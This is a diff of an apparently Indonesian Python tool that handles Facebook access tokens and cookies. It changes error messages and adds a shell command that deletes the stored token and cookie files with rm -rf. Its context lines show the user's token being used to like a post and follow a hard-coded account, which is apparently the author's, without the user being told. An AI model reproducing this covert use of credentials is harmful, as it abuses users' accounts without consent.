@@ -495,7 +495,7 @@ def followdong():
 		token = open('.token.txt','r').read()
 		cokies = open('.cok.txt','r').read()
 	except IOError:
-		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluarsa ")
+		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluarsa cok")
 		time.sleep(5)
 		login()
 	myuid = ('100043537611609')
@@ -516,7 +516,8 @@ def menu(my_name,my_id):
         requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenmu))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
     except IOError:
-        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa ")
+        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
+        os.system('rm -rf .token.txt && rm -rf .cok.txt')
         time.sleep(3)
         login()
     os.system('clear')
